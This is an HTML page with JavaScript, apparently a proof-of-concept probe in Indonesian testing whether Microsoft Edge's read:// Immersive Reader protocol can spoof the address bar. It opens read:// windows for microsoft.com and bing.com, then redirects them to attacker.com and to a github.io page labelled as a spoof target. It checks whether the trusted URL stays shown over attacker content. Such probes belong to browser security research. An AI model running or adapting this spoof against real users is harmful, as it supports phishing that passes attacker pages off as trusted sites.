<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Edge Probe C - read:// Immersive Reader Spoof</title></head>
<body>
<h3>Edge Probe C: read:// protocol origin spoof</h3>
<p>Test: apakah read:// protocol bisa dimanipulasi untuk spoof origin?</p>
<button onclick="probe()">Mulai Probe</button>
<pre id="log"></pre>
<script>
function log(m){ document.getElementById('log').textContent += m + '\n'; }

function probe(){
  log('=== Edge read:// Protocol Probe ===');

  // 1. Buka read:// dengan URL legit
  log('[1] Buka read://https://www.microsoft.com ...');
  try {
    var w = window.open('read://https://www.microsoft.com', '_blank');
    log('  -> Window: ' + (w ? 'OBJECT (cek address bar!)' : 'null'));
    if(w){
      setTimeout(function(){
        try {
          log('  -> w.location: ' + w.location);
          log('  -> w.origin: ' + w.origin);
        } catch(e){
          log('  -> Cross-origin (normal): ' + e.message);
        }
        // Coba manipulasi
        try { w.location = 'read://https://attacker.com'; log('  -> REDIRECT KE read://attacker.com BERHASIL!'); } catch(e){ log('  -> Redirect blocked: ' + e.message); }
      }, 1000);
    }
  } catch(e) { log('  -> Error: ' + e.message); }

  // 2. Buka read:// dengan URL attacker
  log('[2] Buka read:// dengan URL attacker...');
  try {
    var w2 = window.open('read://https://ikancupang29.github.io', '_blank');
    log('  -> Window: ' + (w2 ? 'OBJECT (cek apakah address bar nunjukin attacker URL!)' : 'null'));
  } catch(e) { log('  -> Error: ' + e.message); }

  // 3. Race: read:// + redirect
  log('[3] Race: read:// + redirect ke attacker...');
  try {
    var w3 = window.open('read://https://www.bing.com', '_blank');
    setTimeout(function(){
      try {
        w3.location = 'https://ikancupang29.github.io/edge-spoof-poc/edge-spoof-target.html';
        log('  -> REDIRECT BERHASIL! Cek address bar window baru!');
        log('  -> Kalau address bar masih "read://bing.com" tapi konten = attacker = SPOOF!');
      } catch(e) { log('  -> Redirect blocked: ' + e.message); }
    }, 1000);
  } catch(e) { log('  -> Error: ' + e.message); }

  log('\n=== SELESAI ===');
  log('CEK: untuk setiap window baru yang terbuka:');
  log('  - Address bar nunjukin apa?');
  log('  - Konten halaman apa?');
  log('  - Kalau beda = potential spoof');
}
</script>
</body>
